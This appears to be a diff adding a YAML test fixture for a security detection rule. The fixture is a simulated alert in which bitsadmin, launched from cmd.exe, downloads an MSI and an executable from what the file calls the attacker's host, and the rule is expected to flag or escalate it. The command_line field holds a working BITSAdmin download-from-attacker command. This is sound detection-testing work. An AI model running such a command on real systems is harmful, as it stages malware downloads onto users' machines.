@@ -1,0 +1,18 @@
+# Aimed case for PR-0002: the cheapest attacker position that satisfies the path group's yes answers. It must flag or escalate in every mode, never close.
+detection: D-0002
+name: d-0002-step2-sanctioned-parent
+reason: sanctioned console used to push a BITSAdmin job that downloads from the attacker's host
+proof: PR-0002
+overrides:
+  Q-0001: true
+  Q-0014: 0
+  Q-0017: false
+alert:
+  host.name: ws-11
+  user.name: jdoe
+  process.name: bitsadmin.exe
+  process.parent_name: cmd.exe
+  process.sha256: '2222222222222222222222222222222222222222222222222222222222222222'
+  process.command_line: bitsadmin /transfer j1 /download /priority high https://pkg.corp.example/agent.msi C:\ProgramData\agent.msi https://cdn-dl.example.net/p.exe C:\ProgramData\p.exe
+  event.time: '2026-10-17T08:00:00Z'
+  severity: medium
